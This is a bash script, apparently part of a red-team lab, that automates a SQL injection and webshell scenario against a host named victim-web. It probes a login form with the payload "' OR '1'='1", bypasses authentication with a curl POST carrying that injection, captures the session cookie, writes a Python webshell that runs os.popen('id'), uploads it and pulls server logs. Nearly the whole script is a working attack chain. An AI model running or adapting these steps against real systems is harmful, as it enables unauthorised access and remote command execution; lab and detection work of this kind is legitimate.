#!/bin/bash
set -Eeuo pipefail

show_help() {
    cat <<'USAGE'
Usage: run.sh

Execute the SQL injection webshell scenario. Requires victim-web to run with
ENABLE_RISKY=true. Steps:
  1. Fingerprint injectable parameters using the SQLi probe.
  2. Authenticate via boolean-based SQL injection.
  3. Upload a Python webshell and execute a command.
USAGE
}

if [[ ${1:-} == "--help" || ${1:-} == "-h" ]]; then
    show_help
    exit 0
fi

OUTPUT_DIR="/opt/telemetry/redteam/02-sqli-webshell"
mkdir -p "$OUTPUT_DIR"

python3 /opt/redteam/tools/sqli_probe.py \
    --url http://victim-web:5000/login \
    --payload "' OR '1'='1" \
    --report "$OUTPUT_DIR/probe.json"

LOGIN_RESPONSE=$(curl -si -X POST http://victim-web:5000/login \
    -d "username=admin' OR '1'='1" \
    -d "password=anything")

if ! echo "$LOGIN_RESPONSE" | grep -qi "set-cookie"; then
    echo "Login bypass failed. Ensure ENABLE_RISKY=true and victim-web is reachable." >&2
    exit 1
fi

COOKIE=$(echo "$LOGIN_RESPONSE" | grep -i "set-cookie" | head -n1 | cut -d':' -f2- | tr -d '\r')
echo "$COOKIE" > "$OUTPUT_DIR/session.cookie"

cat > "$OUTPUT_DIR/webshell.py" <<'SHELL'
import os
print(os.popen('id').read())
SHELL

curl -s -b "$COOKIE" -F "webshell=@$OUTPUT_DIR/webshell.py" http://victim-web:5000/upload > "$OUTPUT_DIR/upload.html"

echo "Webshell uploaded. Fetching logs..."
curl -s -b "$COOKIE" http://victim-web:5000/logs > "$OUTPUT_DIR/web_logs.txt"

echo "Scenario 02 artifacts stored in $OUTPUT_DIR"
